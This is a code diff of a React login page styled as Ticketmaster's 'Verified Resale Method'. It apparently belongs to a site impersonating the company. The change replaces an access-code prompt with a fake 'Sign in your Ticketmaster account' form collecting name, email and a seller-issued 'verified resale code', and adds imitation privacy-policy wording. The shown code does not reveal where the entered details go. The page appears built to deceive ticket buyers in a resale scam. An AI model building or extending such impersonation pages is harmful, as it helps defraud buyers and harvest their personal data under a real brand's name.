@@ -9,6 +9,9 @@ function Access({ setAccessGranted }) {
   const navigate = useNavigate();
   const location = useLocation();
   const returnPath = location.state?.returnPath || '/';
+  const [userName, setUserName] = useState('');
+const [userEmail, setUserEmail] = useState('');
+
 
   useEffect(() => {
     const codeRef = ref(db, 'codes/code');
@@ -30,36 +33,59 @@ function Access({ setAccessGranted }) {
   };
 
   return (
-    <div className="flex flex-col items-center justify-center h-screen bg-gradient-to-br from-blue-100 to-white px-4">
-      <div className="mb-28 text-center relative -translate-y-6">
-        <h1 className="text-5xl font-extrabold italic text-blue-700 leading-none tracking-tight">
-          Ticketmaster<sup className="text-sm align-top">®</sup>
-        </h1>
-        <p className="text-sm font-bold italic text-blue-600 mt-1">
-          Verified Resale Method
-        </p>
-      </div>
-      <div className="flex flex-col items-center text-center w-full max-w-md px-6 py-8 bg-white shadow-lg rounded-xl transition-all duration-300">
-        <h2 className="text-2xl font-bold text-gray-800 mb-2">Enter Access Code</h2>
-        <p className="text-gray-600 text-sm mb-4">
-          To gain access, a verified resale code is required from the seller.
-        </p>
-        <input
-          type="password"
-          value={userCode}
-          onChange={(e) => setUserCode(e.target.value)}
-          className="border border-gray-300 px-4 py-2 mb-4 rounded-lg w-full focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
-          placeholder="Access Code"
-        />
-        <button
-          onClick={handleSubmit}
-          className="bg-blue-600 hover:bg-blue-700 text-white font-semibold px-4 py-2 rounded-lg shadow-md transition duration-200 w-full"
-        >
-          Submit
-        </button>
-      </div>
+  <div className="flex flex-col items-center justify-center bg-gradient-to-br from-blue-100 to-white px-4">
+    <div className="mb-20 text-center relative -translate-y-6">
+      <h1 className="text-5xl font-extrabold italic text-blue-700 mt-14 leading-none tracking-tight">
+        Ticketmaster<sup className="text-sm align-top">®</sup>
+      </h1>
+      <p className="text-sm font-bold italic text-blue-600 mt-1 -mb-10">
+        Verified Resale Method
+      </p>
     </div>
-  );
+    <div className="flex flex-col items-center text-center w-full max-w-md px-6 py-8 bg-white shadow-lg rounded-xl transition-all duration-300">
+      <h2 className="text-xl font-bold text-gray-800 mb-1 uppercase">Sign in your Ticketmaster account</h2>
+      <p className="text-gray-600 text-sm mb-6">
+        If you don’t have an account you will be prompted to create one.
+      </p>
+
+      <input
+        type="text"
+        value={userName}
+        onChange={(e) => setUserName(e.target.value)}
+        className="border border-gray-300 px-4 py-2 mb-4 rounded-lg w-full focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
+        placeholder="Name"
+      />
+
+      <input
+        type="email"
+        value={userEmail}
+        onChange={(e) => setUserEmail(e.target.value)}
+        className="border border-gray-300 px-4 py-2 mb-4 rounded-lg w-full focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
+        placeholder="Email"
+      />
+
+      <input
+        type="password"
+        value={userCode}
+        onChange={(e) => setUserCode(e.target.value)}
+        className="border border-gray-300 px-4 py-2 mb-4 rounded-lg w-full focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
+        placeholder="Verified resale code"
+      />
+
+      <button
+        onClick={handleSubmit}
+        className="bg-blue-600 hover:bg-blue-700 text-white font-semibold px-4 py-2 rounded-lg shadow-md transition duration-200 w-full"
+      >
+        Sign in
+      </button>
+
+      <p className="text-xs text-gray-500 mt-6">
+        As set forth in our Privacy Policy, we may use your information for email marketing, including promotions and updates on our own or third-party products. You can opt out of our marketing emails anytime.
+      </p>
+    </div>
+  </div>
+);
+
 }
 
 export default Access;
